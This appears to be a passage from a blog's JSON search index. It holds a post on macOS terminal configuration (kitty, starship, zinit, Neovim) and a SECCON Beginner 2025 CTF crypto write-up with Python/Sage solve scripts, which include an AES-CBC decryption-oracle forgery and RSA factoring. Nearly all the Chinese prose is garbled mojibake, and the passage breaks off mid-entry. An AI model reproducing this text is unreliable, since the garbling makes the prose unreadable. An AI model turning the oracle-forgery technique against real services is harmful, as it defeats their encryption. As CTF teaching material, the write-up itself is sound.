dark-theme.auto.conf ç„¶åé…ç½®ä¸€ä¸‹å­—ä½“å¤§å°ã€å…‰æ ‡æ ·å¼ã€è¾¹æ¡†ã€èƒŒæ™¯é€æ˜åº¦ã€æ¯›ç»ç’ƒæ•ˆæœã€é¡¶éƒ¨æ ·å¼ï¼Œå› ä¸ºæˆ‘æ˜¯macï¼Œè¿˜è¦æ‰“å¼€macçš„é”®ç›˜æ˜ å°„(option) # font font_size 12 # font_family Monaspace Radon disable_ligatures never cursor_shape beam # window hide_window_decorations titlebar-only window_padding_width 10 window_border_width 0.5pt draw_minimal_borders yes background_opacity 0.8 background_blur 64 remember_window_size yes # tab bar tab_bar_edge top tab_bar_style powerline tab_powerline_style slanted # general key mapping macos_option_as_alt yes kittyè¿˜æœ‰ä¸€ä¸ªå·¨å¸…çš„ä¸œè¥¿ï¼Œå…‰æ ‡åŠ¨ç”» cursor_trail 3 ç„¶åå†ç•¥å¾®é…ç½®ä¸€ä¸‹å¿«æ·é”®æ˜ å°„ï¼Œè¿™è¾¹iterm2ç”¨å¤šäº†ï¼Œæ”¹ä¸€ä¸‹ enabled_layouts splits enable_audio_bell no # è·³åˆ°è¡Œå¼€å¤´å’Œç»“å°¾ map cmd+left send_text all \\x01 map cmd+right send_text all \\x05 # è·³è½¬æ ‡ç­¾ map cmd+1 goto_tab 1 map cmd+2 goto_tab 2 map cmd+3 goto_tab 3 map cmd+4 goto_tab 4 map cmd+5 goto_tab 5 map cmd+6 goto_tab 6 map cmd+7 goto_tab 7 map cmd+8 goto_tab 8 map cmd+9 goto_tab 9 ç›®å‰è¿™æ ·å°±å¤Ÿç”¨äº†ï¼Œå¦‚æœæœ‰å…¶ä»–çš„åé¢å†è¡¥å§ ","date":"2025-08-04","objectID":"/terminal-configuration/:2:2","tags":["ç»ˆç«¯"],"title":"Terminal Configuration","uri":"/terminal-configuration/"},{"categories":["é…ç½®","æ‚è°ˆ"],"content":"AeroSpace ä¸€ä¸ªçª—å£å¹³é“ºç®¡ç†è½¯ä»¶ï¼Œä¸ªäººæ„Ÿå—æ¯”yabaiå¥½ï¼Œé…ç½®ä¸ç®—ç¹æ‚ï¼Œæ‰‹é£ç´æ¨¡å¼å¯¹æˆ‘è¿™ç§å°å±å¹•ç”¨æˆ·å¾ˆå‹å¥½ï¼Œæˆ‘çš„é…ç½®å¤§å¤šæ•°æ˜¯ä»å¸•ç‰¹é‡ŒæŸ¯åŸºä¸Šé¢æ‰’ä¸‹æ¥çš„ ","date":"2025-08-04","objectID":"/terminal-configuration/:3:0","tags":["ç»ˆç«¯"],"title":"Terminal Configuration","uri":"/terminal-configuration/"},{"categories":["é…ç½®","æ‚è°ˆ"],"content":"starship å› ä¸ºp10kæ€»æœ‰ä¸€äº›ç¨€å¥‡å¤æ€ªçš„bugï¼Œå¹¶ä¸”ç¼“å­˜æœºåˆ¶å¡å¡çš„ï¼Œè¿™é‡Œæ¢æˆstarshipï¼Œé…ç½®å¯ä»¥å»disä¸Šé¢è‡ªå·±æ‰¾æ‰¾ï¼Œè¿™é‡Œæˆ‘çš„é…ç½®å°±æ˜¯æ‰’ä¸‹æ¥ç„¶åè‡ªå·±æ”¹æ”¹çš„ \"$schema\" = 'https://starship.rs/config-schema.json' add_newline = false command_timeout = 2000 format = \"\"\" $os\\ $username\\ $directory\\ $git_branch\\ $git_commit\\ $git_status\\ $git_metrics\\ $git_state\\ $c\\ $rust\\ $golang\\ $nodejs\\ $php\\ $java\\ $kotlin\\ $haskell\\ $python\\ $package\\ $docker_context\\ $kubernetes\\ $shell\\ $container\\ $jobs\\ ${custom.memory_usage}\\ ${custom.battery}\\ ${custom.keyboard_layout}\\ $time\\ $cmd_duration\\ $status\\ $line_break\\ $character\\ \"\"\" palette = 'default' [palettes.default] color_ok = 'bright-green' color_danger = 'bright-red' color_caution = 'bright-yellow' color_os = 'red' color_username = 'red' color_directory = 'yellow' color_git = 'cyan' color_git_added = 'bright-green' color_git_deleted = 'bright-red' color_env = 'blue' color_kubernetes = 'purple' color_docker = 'blue' color_shell = '' color_container = '' color_other = '' color_time = '' color_duration = '' color_vimcmd_ok = 'green' color_vimcmd_replace = 'purple' color_vimcmd_visual = 'yellow' [palettes.gruvbox_dark] color_ok = '#b8bb26' color_danger = '#fb4934' color_caution = '#d79921' color_os = '#d65d0e' color_username = '#d65d0e' color_directory = '#d79921' color_git = '#689d6a' color_git_added = '#b8bb26' color_git_deleted = '#fb4934' color_env = '#458588' color_kubernetes = '#b16286' color_docker = '#458588' color_shell = '#a89984' color_container = '#cc241d' color_other = '#d5c4a1' color_time = '#fbf1c7' color_duration = '#fbf1c7' color_vimcmd_ok = '#8ec07c' color_vimcmd_replace = '#b16286' color_vimcmd_visual = '#d79921' [palettes.gruvbox_light] color_ok = '#79740e' color_danger = '#9d0006' color_caution = '#d79921' color_os = '#d65d0e' color_username = '#d65d0e' color_directory = '#d79921' color_git = '#689d6a' color_git_added = '#79740e' color_git_deleted = '#9d0006' color_env = '#458588' color_kubernetes = '#b16286' color_docker = '#458588' color_shell = '#7c6f64' color_container = '#cc241d' color_other = '#504945' color_time = '#282828' color_duration = '#282828' color_vimcmd_ok = '#689d6a' color_vimcmd_replace = '#b16286' color_vimcmd_visual = '#d79921' [os] disabled = false style = \"fg:color_os\" format = '[$symbol]($style)' [os.symbols] Windows = \"ó°²\" Ubuntu = \"ó°•ˆ\" SUSE = \"ïŒ”\" Raspbian = \"ó°¿\" Mint = \"ó°£­\" Macos = \"ó°€µ\" Manjaro = \"ïŒ’\" Linux = \"ó°Œ½\" Gentoo = \"ó°£¨\" Fedora = \"ó°£›\" Alpine = \"ïŒ€\" Amazon = \"ï‰°\" Android = \"îœ\" Arch = \"ó°£‡\" Artix = \"ó°£‡\" EndeavourOS = \"ï†—\" CentOS = \"ïŒ„\" Debian = \"ó°£š\" Redhat = \"ó±„›\" RedHatEnterprise = \"ó±„›\" Pop = \"ïŒª\" [username] show_always = true style_user = \"fg:color_username\" style_root = \"bold fg:color_danger\" format = '[ $user ]($style)' [directory] style = \"fg:color_directory\" read_only_style = \"fg:color_directory\" repo_root_style = \"bold fg:color_directory\" format = \"[ $path ]($style)\" read_only = \" ï€£\" home_symbol = \"~\" truncation_symbol = \"â€¦/\" truncation_length = 0 truncate_to_repo = true fish_style_pwd_dir_length = 0 use_logical_path = true [git_branch] symbol = \"î‚ \" style = \"fg:color_git\" format = '\\[[$symbol$branch]($style)\\]' only_attached = true ignore_branches = [] truncation_length = 25 truncation_symbol = \"...\" always_show_remote = false disabled = false [git_commit] style = \"fg:color_git\" format = \"( [($tag)(@$hash)]($style) )\" commit_hash_length = 7 only_detached = true tag_symbol = \"ó°“¼ \" tag_disabled = false disabled = false [git_status] style = \"fg:color_git\" format = '([$ahead_behind]($style) )([$all_status]($style) )' stashed = \"*${count}\" ahead = \"â‡¡${count}\" behind = \"â‡£${count}\" up_to_date = \"\" diverged = \"â‡¡${ahead_count}â‡£${behind_count}\" conflicted = \"=${count}\" deleted = \"Ã—${count}\" renamed = \"Â»${count}\" modified = \"!${count}\" staged = \"+${count}\" untracked = \"?${count}\" ignore_submodules = false disabled = false [git_metrics] format = '([([+$added]($added_style))([-$deleted]($deleted_style))](fg:color_git) )' added_style = \"fg:color_git_added\" deleted_style = \"fg:color_git_deleted\" only_nonzero_diffs = true disabled = false","date":"2025-08-04","objectID":"/terminal-configuration/:4:0","tags":["ç»ˆç«¯"],"title":"Terminal Configuration","uri":"/terminal-configuration/"},{"categories":["é…ç½®","æ‚è°ˆ"],"content":"zinit å®‰è£…æ–¹æ³•å°±ä¸å†™äº†xdï¼Œè¿™é‡Œä¸»è¦çœ‹ä¸€ä¸‹æ’ä»¶(è®°å¾—æŒ‚æ¢¯å­) # é«˜äº® zinit light zsh-users/zsh-syntax-highlighting # è¡¥å…¨ zinit light zsh-users/zsh-autosuggestions zinit light zsh-users/zsh-completions # æœç´¢ zinit light zdharma/history-search-multi-word # lsé«˜äº® source /Users/zsm/.config/color.sh alias ls='gls --color=auto' lsé«˜äº®è¿™ä¸ªè‡ªå·±æ‰¾ä¸€ä¸‹å°±è¡Œäº†ï¼Œæˆ–è€…æ˜¯ç”¨ezaæ›¿ä»£ä¸€ä¸‹ã€‚ ç„¶åæˆ‘é¡ºä¾¿å†™äº†ä¸€ä¸‹å†å²è§„åˆ™ # History HISTSIZE=5000 HISTFILE=~/.zsh_history SAVEHIST=$HISTSIZE HISTDUP=erase setopt appendhistory setopt hist_ignore_space setopt hist_ignore_all_dups setopt hist_save_no_dups setopt hist_ignore_dups setopt hist_find_no_dups å…¶ä»–çš„ç¯å¢ƒå˜é‡ä»€ä¹ˆçš„è‡ªå·±åŠ è¿›å»å°±è¡Œäº†ï¼Œè®°å¾—å†™å¥½æ³¨é‡Šï¼Œè¦ä¸ç„¶å›å¤´å¿˜äº† ","date":"2025-08-04","objectID":"/terminal-configuration/:5:0","tags":["ç»ˆç«¯"],"title":"Terminal Configuration","uri":"/terminal-configuration/"},{"categories":["é…ç½®","æ‚è°ˆ"],"content":"nvim æˆ‘æƒ³ç”¨è¿™ä¸ªnvimå¾ˆä¹…äº†xdï¼Œè¿™é‡Œé‡‡ç”¨AstroNvimä½œä¸ºèµ·ç‚¹ ","date":"2025-08-04","objectID":"/terminal-configuration/:6:0","tags":["ç»ˆç«¯"],"title":"Terminal Configuration","uri":"/terminal-configuration/"},{"categories":["é…ç½®","æ‚è°ˆ"],"content":"render-markdown å†™markdownå¿…å¤‡çš„ä¸€ä¸ªæ’ä»¶ï¼Œè¿™é‡Œæ‰‹åŠ¨æ·»åŠ åˆ°~/.config/nvim/lua/plugins/é‡Œé¢ return { 'MeanderingProgrammer/render-markdown.nvim', dependencies = { 'nvim-treesitter/nvim-treesitter', 'echasnovski/mini.nvim' }, -- if you use the mini.nvim suite -- dependencies = { 'nvim-treesitter/nvim-treesitter', 'echasnovski/mini.icons' }, -- if you use standalone mini plugins -- dependencies = { 'nvim-treesitter/nvim-treesitter', 'nvim-tree/nvim-web-devicons' }, -- if you prefer nvim-web-devicons ---@module 'render-markdown' ---@type render.md.UserConfig opts = {}, config=function (_,opts) require(\"render-markdown\").setup(opts) end } ","date":"2025-08-04","objectID":"/terminal-configuration/:6:1","tags":["ç»ˆç«¯"],"title":"Terminal Configuration","uri":"/terminal-configuration/"},{"categories":["é…ç½®","æ‚è°ˆ"],"content":"flash å¼ºå¤§çš„å…‰æ ‡è·³è½¬æ’ä»¶ï¼ŒåŒæ ·æ·»åŠ è¿›å» return { \"folke/flash.nvim\", event = \"VeryLazy\", ---@type Flash.Config opts = { modes={ search={ enabled=true, }, }, }, -- stylua: ignore keys = { { \"s\", mode = { \"n\", \"x\", \"o\" }, function() require(\"flash\").jump() end, desc = \"Flash\" }, { \"S\", mode = { \"n\", \"x\", \"o\" }, function() require(\"flash\").treesitter() end, desc = \"Flash Treesitter\" }, { \"r\", mode = \"o\", function() require(\"flash\").remote() end, desc = \"Remote Flash\" }, { \"R\", mode = { \"o\", \"x\" }, function() require(\"flash\").treesitter_search() end, desc = \"Treesitter Search\" }, { \"\u003cc-s\u003e\", mode = { \"c\" }, function() require(\"flash\").toggle() end, desc = \"Toggle Flash Search\" }, }, } ","date":"2025-08-04","objectID":"/terminal-configuration/:6:2","tags":["ç»ˆç«¯"],"title":"Terminal Configuration","uri":"/terminal-configuration/"},{"categories":["é…ç½®","æ‚è°ˆ"],"content":"community ä¸€ä¸ªç¤¾åŒºæ’ä»¶ï¼Œå¯ä»¥ç›´æ¥ä¸‹è½½astroç¤¾åŒºé‡Œé¢çš„æ’ä»¶ï¼Œå…ˆç”¨ç”¨ return { -- Add the community repository of plugin specifications \"AstroNvim/astrocommunity\", -- example of importing a plugin -- available plugins can be found at https://github.com/AstroNvim/astrocommunity { import = \"astrocommunity.colorscheme.catppuccin\" }, { import = \"astrocommunity.completion.copilot-lua\" }, -- example of importing an entire language pack -- these packs can set up things such as Treesitter, Language Servers, additional language specific plugins, and more! { import = \"astrocommunity.pack.rust\" }, { import = \"astrocommunity.pack.python\" }, { import = \"astrocommunity.pack.go\"}, } ","date":"2025-08-04","objectID":"/terminal-configuration/:6:3","tags":["ç»ˆç«¯"],"title":"Terminal Configuration","uri":"/terminal-configuration/"},{"categories":["é…ç½®","æ‚è°ˆ"],"content":"æœ€å ç›®å‰è¿™äº›æ˜¯å¤Ÿç”¨çš„ï¼Œyaziè¿˜æ²¡æœ‰é¢å¤–é…ç½®ï¼Œåé¢ä¼šåŠ è¿›æ¥ã€‚ ","date":"2025-08-04","objectID":"/terminal-configuration/:7:0","tags":["ç»ˆç«¯"],"title":"Terminal Configuration","uri":"/terminal-configuration/"},{"categories":["CTF"],"content":"seccon beginner 2025","date":"2025-07-27","objectID":"/secconbeginner2025-wp/","tags":["crypto"],"title":"Seccon beginner 2025 Wp","uri":"/secconbeginner2025-wp/"},{"categories":["CTF"],"content":"æ•´ä½“æ¦‚å†µ rank 135/880 æ„Ÿè§‰å¯ä»¥æ›´é«˜çš„ï¼Œæ¯•ç«Ÿæ²¡æœ‰ä¸€ç›´æ‰“ï¼Œè¿™æ¬¡ä¸»è¦æ°´äº†ä¸€ä¸‹cryå’Œreï¼Œä¸‹é¢æ˜¯æ•´ä½“é¢˜ç›®æƒ…å†µ ## crypto ### seesaw (100pt / 612 solves) ### 01-Translator (100pt / 280 solves) ### Elliptic4b (272pt / 171 solves) ### Golden Ticket (491pt / 35 solves) ### mathmyth (452pt / 79 solves) ## reversing ### CrazyLazyProgram1 (100pt / 654 solves) ### CrazyLazyProgram2 (100pt / 468 solves) ### D-compile (100pt / 335 solves) ### wasm_S_exp (100pt / 330 solves) ### MAFC (339pt / 144 solves) ### code_injection (441pt / 88 solves) åŠ *å·çš„æ˜¯æ²¡å‡ºæ¥çš„ ","date":"2025-07-27","objectID":"/secconbeginner2025-wp/:1:0","tags":["crypto"],"title":"Seccon beginner 2025 Wp","uri":"/secconbeginner2025-wp/"},{"categories":["CTF"],"content":"Crypto ","date":"2025-07-27","objectID":"/secconbeginner2025-wp/:2:0","tags":["crypto"],"title":"Seccon beginner 2025 Wp","uri":"/secconbeginner2025-wp/"},{"categories":["CTF"],"content":"seesaw task.py import os from Crypto.Util.number import getPrime FLAG = os.getenv(\"FLAG\", \"ctf4b{dummy_flag}\").encode() m = int.from_bytes(FLAG, 'big') p = getPrime(512) q = getPrime(16) n = p * q e = 65537 c = pow(m, e, n) print(f\"{n = }\") print(f\"{c = }\") åˆ†è§£åç”¨på³å¯ p = n = c = from Crypto.Util.number import* print(long_to_bytes(pow(c,inverse(65537,p-1),p))) ","date":"2025-07-27","objectID":"/secconbeginner2025-wp/:2:1","tags":["crypto"],"title":"Seccon beginner 2025 Wp","uri":"/secconbeginner2025-wp/"},{"categories":["CTF"],"content":"01-Translator task.py import os from Crypto.Cipher import AES from Crypto.Util.Padding import pad from Crypto.Util.number import bytes_to_long def encrypt(plaintext, key): cipher = AES.new(key, AES.MODE_ECB) return cipher.encrypt(pad(plaintext.encode(), 16)) flag = os.environ.get(\"FLAG\", \"CTF{dummy_flag}\") flag_bin = f\"{bytes_to_long(flag.encode()):b}\" trans_0 = input(\"translations for 0\u003e \") trans_1 = input(\"translations for 1\u003e \") flag_translated = flag_bin.translate(str.maketrans({\"0\": trans_0, \"1\": trans_1})) key = os.urandom(16) print(\"ct:\", encrypt(flag_translated, key).hex()) ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„é¢˜ç›®ï¼ŒæŠŠäºŒè¿›åˆ¶é‡Œé¢çš„0/1æ›¿æ¢æ‰ï¼Œç„¶åå†AES-ECBåŠ å¯†ã€‚ ä¸»è¦è§£å¯†çš„æ–¹æ³•å°±æ˜¯è¾“å…¥ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œç„¶åæ ¹æ®é¢‘ç‡é€‰å‡ºä¸¤å—ï¼Œåˆ†åˆ«å°è¯•A-\u003e1,B-\u003e0/B-\u003e1,A-\u003e0ï¼Œç„¶åå°±å¯ä»¥è§£å¯†æˆåŠŸäº†ï¼Œè¿™é‡Œè„šæœ¬é€šè¿‡geminiç¼–å†™ from Crypto.Util.number import long_to_bytes ct = '' zero = '' one = '' ct = '' zero = '' one = '' block_size = 32 blocks = [ct[i:i+block_size] for i in range(0, len(ct), block_size)] bitstring = '' for block in blocks: if block == one: bitstring += '1' elif block == zero: bitstring += '0' num = int(bitstring, 2) print(long_to_bytes(num)) ","date":"2025-07-27","objectID":"/secconbeginner2025-wp/:2:2","tags":["crypto"],"title":"Seccon beginner 2025 Wp","uri":"/secconbeginner2025-wp/"},{"categories":["CTF"],"content":"Elliptic4b task.py import os import secrets from fastecdsa.curve import secp256k1 from fastecdsa.point import Point flag = os.environ.get(\"FLAG\", \"CTF{dummy_flag}\") y = secrets.randbelow(secp256k1.p) print(f\"{y = }\") x = int(input(\"x = \")) if not secp256k1.is_point_on_curve((x, y)): print(\"// Not on curve!\") exit(1) a = int(input(\"a = \")) P = Point(x, y, secp256k1) Q = a * P if a \u003c 0: print(\"// a must be non-negative!\") exit(1) if P.x != Q.x: print(\"// x-coordinates do not match!\") exit(1) if P.y == Q.y: print(\"// P and Q are the same point!\") exit(1) print(\"flag =\", flag) è¿™ä¸ªECCé¢˜ç›®å°±å¾ˆå°±ç®€å•äº†ï¼Œé¢˜ç›®ç”Ÿæˆäº†ä¸€ä¸ªyå€¼ï¼Œæˆ‘ä»¬è¦è¾“å…¥ä¸€ä¸ªxå¹¶ä¸”ç¡®ä¿åœ¨æ›²çº¿ä¸Šï¼Œç„¶åè¾“å…¥aï¼Œå¹¶ä¸”æ»¡è¶³åé¢çš„æ¡ä»¶ è§£å¯†æ–¹æ³•å¾ˆç®€å•ã€‚ä½ é¦–å…ˆè¦çŸ¥é“secp256k1æ›²çº¿çš„æ–¹ç¨‹æ˜¯yÂ² = xÂ³ + 7 (mod p)ï¼Œxå¯ä»¥ç›´æ¥æ±‚å‡ºï¼Œåé¢å°±æ˜¯ECCçš„å¸¸è¯†(qâˆ’1)â‹…P=âˆ’Pï¼Œé‚£ä¹ˆaå°±å‡ºæ¥äº† import sympy from pwn import remote from fastecdsa.curve import secp256k1 p = secp256k1.p q = secp256k1.q while True: try: io = remote('elliptic4b.challenges.beginners.seccon.jp', 9999) io.recvuntil(b'y = ') y = int(io.recvline().strip()) print(f\"[*] Received y = {y}\") c = (y * y - 7) % p x = sympy.nthroot_mod(c, 3, p, all_roots=False) io.sendlineafter(b'x = ', str(x).encode()) print(\"[*] Sent x.\") a = q - 1 io.sendlineafter(b'a = ', str(a).encode()) print(\"[*] Sent a.\") # 4. æ¥æ”¶ flag å¹¶é€€å‡ºå¾ªç¯ print(\"\\n[+] Success! Flag:\") response = io.recvall(timeout=2) print(response.decode()) io.close() break except Exception as e: print(f\"[!] An error occurred: {e}. Retrying...\") if 'io' in locals() and io: io.close() ","date":"2025-07-27","objectID":"/secconbeginner2025-wp/:2:3","tags":["crypto"],"title":"Seccon beginner 2025 Wp","uri":"/secconbeginner2025-wp/"},{"categories":["CTF"],"content":"mathmyth task.py from Crypto.Util.number import getPrime, isPrime, bytes_to_long import os, hashlib, secrets def next_prime(n: int) -\u003e int: n += 1 while not isPrime(n): n += 1 return n def g(q: int, salt: int) -\u003e int: q_bytes = q.to_bytes((q.bit_length() + 7) // 8, \"big\") salt_bytes = salt.to_bytes(16, \"big\") h = hashlib.sha512(q_bytes + salt_bytes).digest() return int.from_bytes(h, \"big\") BITS_q = 280 salt = secrets.randbits(128) r = 1 for _ in range(4): r *= getPrime(56) for attempt in range(1000): q = getPrime(BITS_q) cand = q * q * next_prime(r) + g(q, salt) * r if isPrime(cand): p = cand break else: raise RuntimeError(\"Failed to find suitable prime p\") n = p * q e = 0x10001 d = pow(e, -1, (p - 1) * (q - 1)) flag = os.getenv(\"FLAG\", \"ctf4b{dummy_flag}\").encode() c = pow(bytes_to_long(flag), e, n) print(f\"n = {n}\") print(f\"e = {e}\") print(f\"c = {c}\") print(f\"r = {r}\") ä¸€ä¸ªæœ‰è¶£çš„æ•°å­¦é¢˜ã€‚ $$ n=p*q=q^3*rr+g*q*r \\\\ n=q^3*rr \\mod r $$ræ˜¯å››ä¸ªç´ æ•°ç›¸ä¹˜ï¼Œè‡ªç„¶è€Œç„¶crtï¼Œq = t+kræ˜¯ä¸èƒ½æ±‚å‡ºçš„ï¼Œåé¢å‘ç°ç›´æ¥ç¡¬çˆ†ï¼Œå‡è®¾gé‚£ä¸€å—ä¸º0ï¼Œæˆ‘ä»¬å¯ä»¥è½»æ˜“çš„æ±‚å‡ºqï¼Œé‚£ä¹ˆéšç€kçš„ä¸‹é™ï¼Œgçš„å€¼å°±ä¼šä¸Šå‡ï¼Œgå¤§çº¦åœ¨512bitsä¸€ä¸‹ï¼Œé‚£ä¹ˆçˆ†ç ´çš„æ¬¡æ•°å°±æ˜¯å‡ ç™¾æ¬¡ã€‚å¾ˆå¥½çš„ä¸€ç§æ–¹æ³• from sage.all import* from Crypto.Util.number import* n = e = 65537 c = r = def solve(n, e, c, r, max_steps=600): rp = next_prime(r) prime_factors_r = [p for p, _ in factor(r)] residues_per_prime = [] for pi in prime_factors_r: Z_pi = IntegerModRing(pi) Ai = Z_pi(n) * Z_pi(rp)^-1 roots = Ai.nth_root(3, all=True) residues_per_prime.append(list(map(int, roots))) # ä½¿ç”¨ itertools.product ç”Ÿæˆæ‰€æœ‰ä½™æ•°ç»„åˆï¼Œç„¶åç”¨CRTæ±‚è§£ from itertools import product t_list = [crt(list(res_combo), prime_factors_r) for res_combo in product(*residues_per_prime)] print(t_list) for t in t_list: Q0, _ = (n // rp).nth_root(3, truncate_mode=True) # q = t + k*r, å› æ­¤ k â‰ˆ (Q0 - t) / r k0 = (Q0 - t) // r for k in range(k0, k0 - max_steps, -1): q_candidate = t + k * r if q_candidate \u003c= 1 or not is_prime(q_candidate): continue num = n - q_candidate^3 * rp den = r * q_candidate if num \u003e 0 and num % den == 0: S = num // den p_candidate = q_candidate^2 * rp + r * S if p_candidate * q_candidate == n and is_prime(p_candidate): p, q = p_candidate, q_candidate print(f\"âœ… æˆåŠŸæ‰¾åˆ°å› å­!\") print(f\" p = {p}\") print(f\" q = {q}\") # 3. è§£å¯† phi = (p - 1) * (q - 1) d = inverse_mod(e, phi) m = power_mod(c, d, n) return long_to_bytes(m) return None flag = solve(n, e, c, r) print(flag) copperçš„å†™æ³• æœ€è¿‘cusoåº“å…¬å¼€äº†ï¼Œå¯ä»¥ç”¨è¿™ä¸ªç›´æ¥æ±‚ï¼Œéå¸¸çš„nb from sage.all import * from Crypto.Util.number import * import cuso import ast n = e = 65537 c = r = a = next_prime(r) - r for Q in Zmod(r)(n/a).nth_root(3, all=True): Q = int(Q) x, p = var(\"x, p\") roots = cuso.find_small_roots( relations=[Q+x*r], bounds={x: (0, 2**59)}, modulus_multiple=n, modulus_lower_bound=2**279, modulus_upper_bound=2**280 ) for root in roots: p = int(root[p]) q = n // p print(long_to_bytes(pow(c, pow(e, -1, (p-1)*(q-1)), n))) break ","date":"2025-07-27","objectID":"/secconbeginner2025-wp/:2:4","tags":["crypto"],"title":"Seccon beginner 2025 Wp","uri":"/secconbeginner2025-wp/"},{"categories":["CTF"],"content":"Golden Ticket(*) task.py import os from Crypto.Cipher import AES from Crypto.Util.Padding import pad flag = os.environ.get(\"FLAG\", \"ctf4b{dummy_flag}\") iv = os.urandom(16) key = os.urandom(16) challenge = os.urandom(16 * 6) ENC_TICKET = 3 DEC_TICKET = 3 GOLDEN_TICKET = 0 def menu() -\u003e int: print(\"Your tickets:\") if ENC_TICKET \u003e 0: print(f\"{ENC_TICKET} encryption ticket(s)\") if DEC_TICKET \u003e 0: print(f\"{DEC_TICKET} decryption ticket(s)\") if GOLDEN_TICKET \u003e 0: print(f\"{GOLDEN_TICKET} golden ticket(s)\") print() print(f\"1. Encrypt\") print(f\"2. Decrypt\") print(f\"3. Get ticket\") print(f\"4. Get flag\") print(f\"5. Quit\") while True: i = int(input(\"\u003e \")) if 1 \u003c= i \u003c= 5: return i print(\"Invalid input!\") def consume_ticket(enc: int = 0, dec: int = 0, golden: int = 0): global ENC_TICKET, DEC_TICKET, GOLDEN_TICKET if ENC_TICKET \u003c enc or DEC_TICKET \u003c dec or GOLDEN_TICKET \u003c golden: print(\"Not enough tickets.\") exit(1) ENC_TICKET -= enc DEC_TICKET -= dec GOLDEN_TICKET -= golden while True: i = menu() if i == 1: consume_ticket(enc=1) pt = bytes.fromhex(input(\"pt\u003e \")) if len(pt) \u003e 16: print(\"Input must not be longer than 16 bytes.\") continue cipher = AES.new(key, AES.MODE_CBC, iv=iv) print(f\"ct:\", cipher.encrypt(pad(pt, 16)).hex()) if i == 2: consume_ticket(dec=1) ct = bytes.fromhex(input(\"ct\u003e \")) if len(ct) \u003e 16: print(\"Input must not be longer than 16 bytes.\") continue cipher = AES.new(key, AES.MODE_CBC, iv=iv) print(\"pt:\", cipher.decrypt(pad(ct, 16)).hex()) if i == 3: print(\"challenge:\", challenge.hex()) answer = bytes.fromhex(input(\"answer\u003e \")) if len(answer) != len(challenge) + 16: print(\"Wrong length.\") continue cipher = AES.new(key, AES.MODE_CBC, iv=answer[:16]) if cipher.decrypt(answer[16:]) == challenge: print(\"Correct!\") GOLDEN_TICKET += 1337 else: print(\"Wrong :(\") if i == 4: consume_ticket(golden=1) print(\"flag:\", flag) if i == 5: print(\"Bye!\") exit(0) æˆ‘å¯¹aesçš„äº†è§£è¿˜æ˜¯å¤ªå°‘äº†ï¼Œéœ€è¦è¡¥å……ä¸€ä¸‹è¿™æ–¹é¢çš„çŸ¥è¯†äº†ã€‚ æ•´ä¸ªä»£ç åº”è¯¥æŒºå¥½é˜…è¯»çš„å§ é€‰é¡¹ä¸€å°±æ˜¯åŠ å¯† é€‰é¡¹äºŒå°±æ˜¯è§£å¯† é€‰é¡¹ä¸‰ï¼ŒæœåŠ¡å™¨ç»™ä¸€ä¸ªchallengeï¼Œæˆ‘ä»¬ä¼ ä¸€ä¸ªanswerå¹¶ä¸”åŠ å¯†åè¦æ»¡è¶³AES-CBC-Decrypt(ciphertext, iv, key) == challenge é€‰é¡¹å››å¾—åˆ°flag é¦–å…ˆæˆ‘ä»¬è‚¯å®šè¦è·å–challengeçš„å€¼ï¼Œ ç„¶åæˆ‘ä»¬è¦æ±‚å‡ºivï¼Œæ±‚ivçš„æ–¹æ³•è€ç”Ÿå¸¸è°ˆäº†ï¼Œ æˆ‘ä»¬è¾“å…¥b\"\\x10\"*16ï¼ŒåŠ å¯†æ—¶ä¼špaddingï¼Œä¹Ÿå°±æ˜¯å®é™…åŠ å¯†äº†b\"\\x10\"*32ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å¾—åˆ°çš„æ˜¯d1å’Œd2ï¼Œåˆ†åˆ«æ˜¯d1 = xor(encrypt(b\"\\x10\"*16), iv)ã€d2 = xor(encrypt(b\"\\x10\"*16), b\"\\x10\"*16)ï¼Œè¿™é‡Œxorå°±å¯ä»¥æ±‚å‡ºiv é‚£ä¹ˆå‰é¢å‡ æ®µå¯ä»¥é€šè¿‡xoræ±‚å‡ºæ¥ åé¢çš„éƒ¨åˆ†é€šè¿‡encryptå°±å¯ä»¥æ¨å‡ºæ¥ import os from pwn import * sc = remote(\"golden-ticket.challenges.beginners.seccon.jp\", 9999) def enc_oracle(pt): sc.recvuntil(b\"\u003e \") sc.sendline(b\"1\") sc.recvuntil(b\"\u003e \") sc.sendline(pt.hex().encode()) sc.recvuntil(b\": \") return bytes.fromhex(sc.recvline().decode()) def dec_oracle(pt): sc.recvuntil(b\"\u003e \") sc.sendline(b\"2\") sc.recvuntil(b\"\u003e \") sc.sendline(pt.hex().encode()) sc.recvuntil(b\": \") return bytes.fromhex(sc.recvline().decode()) def get_ticket(answer): sc.recvuntil(b\"\u003e \") sc.sendline(b\"3\") sc.recvuntil(b\": \") challenge = bytes.fromhex(sc.recvline().decode()) sc.recvuntil(b\"\u003e \") sc.sendline(answer.hex().encode()) sc.recvline() return challenge chal = get_ticket(b\"a\") chal = [chal[i:i+16] for i in range(0, len(chal), 16)] f3 = b\"\\x10\"*16 d = dec_oracle(f3) print(d) iv = xor(b\"\\x10\"*16, d[:16], d[16:]) f2 = xor(f3, d[16:], chal[2]) f1 = xor(dec_oracle(f2)[:16], iv, chal[1]) f0 = xor(dec_oracle(f1)[:16], iv, chal[0]) f4 = enc_oracle(xor(f3, iv, chal[3]))[:16] f5 = enc_oracle(xor(f4, iv, chal[4]))[:16] f6 = enc_oracle(xor(f5, iv, chal[5]))[:16] get_ticket(f0+f1+f2+f3+f4+f5+f6) sc.recvuntil(b\"\u003e \") sc.sendline(b\"4\") print(sc.recvline().decode()) ","date":"2025-07-27","objectID":"/secconbeginner2025-wp/:2:5","tags":["crypto"],"title":"Seccon beginner 2025 Wp","uri":"/secconbeginner2025-wp/"},{"categories":["CTF"],"content":"æ€»ç»“ seccon beginnerçš„é¢˜è¿˜æ˜¯ä¸€å¦‚æ—¢å¾€çš„åˆæ–°åˆå¥½ ","date":"2025-07-27","objectID":"/secconbeginner2025-wp/:3:0","tags":["crypto"],"title":"Seccon beginner 2025 Wp","uri":"/secconbeginner2025-wp/"},{"categories":["CTF"],"content":"å‰è¨€ æ¾³é—¨çš„ä¸€ä¸ªæ¯”èµ›ï¼Œå¥–å“æ¯”è¾ƒå¥½ï¼Œå°±å†²äº†xdï¼Œå¤ç›˜ä¸€ä¸‹ï¼Œåé¢ä¼šè¡¥é¢˜ ","date":"2025-07-17","objectID":"/mocsctf2025-wp/:1:0","tags":["crypto"],"title":"Mocsctf2025 